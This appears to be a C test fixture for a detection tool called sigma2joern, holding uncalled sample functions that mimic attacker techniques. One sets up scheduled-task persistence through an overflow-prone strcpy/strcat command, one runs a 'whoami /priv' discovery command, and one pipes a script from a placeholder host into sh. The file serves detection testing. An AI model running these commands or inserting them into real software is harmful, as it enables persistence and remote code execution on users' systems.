/* Test fixture for sigma2joern. The functions are never called (main returns at once). */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <windows.h>

void install(const char *path) {
    char buf[512];
    strcpy(buf, "schtasks /create /sc minute /mo 5 /tn \"Updater\" /tr ");
    strcat(buf, path);
    system(buf);
}

void discover(void) {
    char cmdline[256];
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi;
    snprintf(cmdline, sizeof(cmdline), "%s /c %s", "cmd.exe", "whoami /priv");
    CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

void update(void) {
    execl("/bin/sh", "sh", "-c", "curl -fsSL http://example.invalid/i.sh | sh", (char *)NULL);
}

int main(void) { return 0; }
